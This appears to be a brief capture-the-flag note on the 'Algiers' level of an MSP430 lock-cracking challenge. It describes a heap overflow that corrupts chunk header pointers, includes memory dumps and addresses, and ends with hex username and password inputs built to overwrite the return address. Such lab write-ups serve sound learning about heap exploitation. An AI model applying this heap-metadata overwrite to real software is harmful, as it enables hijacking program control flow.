# Algiers

New account manager which maps user to pins - 4 digits

Malloc 0x10

Accepts 0x30 in first input

Return address at 4390

In the heap, there seems to be some address that are used that are stored in front of each buffer. These can probably be manipulated to control the program

```
2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA
2410:   4141 4141 4141 0000 0000 0000 0000 0824   AAAAAA.........$
2420:   3424 2100 3132 3334 0000 0000 0000 0000   4$!.1234........
2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
```

"Header" of password buffer `241e:   0824 3424 2100`

0x2408 definitely seems to be being used as an address to point to the header of the username buffer

If we look at the header of the username buffer, the second argument is pointer to the header of the password buffer

```
2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA
2410:   4141 4141 4141 0000 0000 0000 0000 0824   AAAAAA.........$
2420:   0824 c21f 3132 3334 0000 0000 0000 0000   .$..1234........
2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
```

1e24 - value to be placed here (ret add) which is 0x4690

and 

4564
455e

3424 - Destination to be placed here dest is 439a

Username
41414141414141414141414141414141964304441e01

Pass:
414141414141414141414141414141410943